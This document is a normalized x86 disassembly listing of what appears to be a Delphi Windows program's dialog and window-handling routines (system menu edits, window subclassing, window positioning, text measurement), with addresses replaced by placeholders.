add eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0xc ]
cmp eax [ edx ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f0b4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_46693c
xor edx edx
mov eax ebx
call sub_448498
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
pop esi
pop ebx
retn
sub_42f0d8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7d8
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
sub_42f158
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_464e14
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_42f0d8
pop ecx
sub_42f17c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_466ab8
mov edx esp
mov eax esi
call sub_44894c
push 0x20
call GetSystemMetrics
mov esi eax
push 0x21
call GetSystemMetrics
neg eax
push eax
neg esi
push esi
lea eax [ esp + 0x8 ]
push eax
call InflateRect
mov eax [ ebx + 0xc ]
cmp eax 0x11
ja r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov al [ eax + lookup_table_42f1d0 ]
jmp [ eax * 4 + jump_table_42f1e2 ]
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0x4 ]
jge r-xdata
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov [ ebx + 0xc ] 0x2
jmp r-xdata
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0xc ]
jle r-xdata
movsx eax [ ebx + 0xa ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov [ ebx + 0xc ] 0xa
jmp r-xdata
mov [ ebx + 0xc ] 0xc
jmp r-xdata
mov [ ebx + 0xc ] 0xb
jmp r-xdata
mov [ ebx + 0xc ] 0xc
jmp r-xdata
mov [ ebx + 0xc ] 0xa
jmp r-xdata
mov [ ebx + 0xc ] 0xf
jmp r-xdata
mov [ ebx + 0xc ] 0xb
mov [ ebx + 0xc ] 0xf
jmp r-xdata
sub_42f1d6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add al [ eax ]
add al 0x5
jno sub_42f1d6
inc edx
add dl bh
int1
inc edx
add [ esi ] dl
inc edx
add [ edx ] dh
inc edx
add [ ebx ] bh
inc edx
add [ edi - 0xe ] dl
inc edx
add [ edi ] cl
mov edi 0x443b0a43
and al 0x4
jge r-xdata
mov [ ebx + 0xc ] 0xa
jmp r-xdata
mov [ ebx + 0xc ] 0xc
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_42f278
mov [ eax + 0x308 ] 0x0
mov ecx [ edx + 0x4 ]
add ecx 0xfffffff6
sub ecx 0x2
jb r-xdata
mov [ eax + 0x308 ] 0x1
jmp r-xdata
je r-xdata
call sub_466ae0
retn
mov [ eax + 0x308 ] 0x2
sub ecx 0x3
je r-xdata
jmp r-xdata
sub_42f2ac
push ebx
mov ebx eax
mov eax ebx
call sub_461a10
mov al [ ebx + 0x308 ]
dec al
je r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ ebx + 0x2fc ]
add [ ebx + 0x300 ] eax
pop ebx
retn
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
sub eax [ ebx + 0x2f8 ]
add [ ebx + 0x304 ] eax
jmp r-xdata
pop ebx
retn
sub_42f2e8
push ebx
mov ebx eax
mov eax [ edx + 0x4 ]
and eax 0xfff0
cmp eax 0xf000
jne r-xdata
mov eax ebx
call sub_465148
mov [ ebx + 0x308 ] 0x0
pop ebx
retn
xor eax eax
mov [ ebx + 0x304 ] eax
xor eax eax
mov [ ebx + 0x300 ] eax
sub_42f31c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f341
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f348
retn
sub_42f354
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f379
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f380
retn
sub_42f38c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f3b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f3b8
retn
sub_42f3c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f3e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f3f0
retn
sub_42f3fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f421
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f428
retn
sub_42f4dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f501
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f508
retn
sub_42f514
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f539
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f540
retn
sub_42f550
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xf6
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
cmc
inc edx
add al bh
cmc
inc edx
add [ eax ] bl
add [ eax ] al
mov al 0x6d
inc ecx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add al bl
std
inc edx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebp + edi * 8 + 0x42 ] bh
add al bh
lea eax [ ecx ]
mov al 0x10
inc edx
add [ ecx * 4 + 0x11880041 ] dl
inc edx
add [ eax + edx + 0x42 ] dl
add [ eax - 0x6fffbdef ] bl
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ edi * 8 - 0x1a3ffbe ] dh
inc edx
add [ eax - 0x57ffbd03 ] dh
inc [ edx ]
pop esp
sub [ eax ] eax
add eax 0x10000200
add [ edx - 0x11001100 ] eax
jmp [ esi + edi * 8 + 0x42 ]
sub_42fc18
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_467028
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_4635c8
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_4635c8
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_466d2c
mov edi eax
mov eax ebx
call sub_466d10
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_466cf8
mov edi eax
mov eax ebx
call sub_466d44
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_42fccc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42fc18
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42fd34
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420d38
mov [ esi + 0x30 ] 0x1
push esi
push sub_42fe10
call sub_421ddc
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42fd7c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420d84
test bl bl
jle r-xdata
call sub_421e74
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_42fdb0
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_469ac0
mov cl 0x1
sub_42fdd8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403378
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42fe10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42fe3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fea8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_4603d8
mov [ ebp - 0x14 ] eax
call sub_4602f4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42ff6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4693b0
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42ff3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ff44
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46940c
retn
sub_42ff44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ff72
mov eax [ ebp - 0x14 ]
call sub_46048c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_4602fc
retn
sub_42ffa4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_42fc18
sub_430028
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42fd34
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4300a1
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_403128
mov eax [ esi + 0x58 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42fd7c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4300dc
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_430764
mov eax edi
mov si 0xffed
call sub_403324
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_430104
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_42fe5c
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_430148 ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_4300dc
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403324
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_403324
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_403324
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_403324
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_403324
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_430200
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_430288
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4302ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_41ce8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4302c1
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_4302c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4210b0
push ebx
push sub_430288
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_430308
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403eb8
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_4041c4
mov eax [ ebx ]
call sub_404378
mov dl 0x7c
call sub_40c66c
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40c66c
test eax eax
jne r-xdata
sub_430358
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_430609
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402b34
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_430308
mov eax [ ebp - 0x8 ]
call sub_404378
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_404378
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_404504
mov eax [ ebp - 0xc ]
call sub_404378
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402b34
mov eax [ ebx + 0x78 ]
call sub_404378
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_4088d0
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_404378
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404378
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_408774
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_404418
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_403f50
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_42fccc
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_42ffa4
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430610
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403edc
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_430764
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_43061c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40c66c
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_403fa8
inc ebx
mov eax edi
mov edx esi
call sub_4040b0
mov eax esi
call sub_408884
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_430664
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_430749
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43061c
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43061c
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4086bc
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430750
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43061c
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404178
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4041c4
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_430764
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43080f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_43061c
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_430664
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_403f0c
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430816
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_43081c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_4170c4
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430870
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_403f0c
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_408a58
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_4308d8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_404178
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_4043d8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c468
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c49c
test al al
jne r-xdata
dec ebx
sub_430964
push ebx
push esi
add esp 0xffffffcc
mov ebx edx
mov esi eax
xor eax eax
mov edx esp
lea ecx [ eax + 0x41 ]
mov [ edx ] cl
inc eax
inc edx
cmp eax 0x1a
jne r-xdata
xor eax eax
lea edx [ esp + 0x1a ]
lea ecx [ eax + 0x61 ]
mov [ edx ] cl
inc eax
inc edx
cmp eax 0x1a
jne r-xdata
push ebx
push 0x34
lea eax [ esp + 0x8 ]
push eax
mov eax esi
call sub_425280
push eax
call GetTextExtentPointA
mov eax [ ebx ]
mov ecx 0x34
cdq
idiv ecx
mov [ ebx ] eax
add esp 0x34
pop esi
pop ebx
retn
sub_430b30
push ebp
mov ebp esp
add esp 0xfffffeac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x0
xor edx edx
mov eax esi
call sub_461df8
mov [ ebp - 0x154 ] 0x154
push 0x0
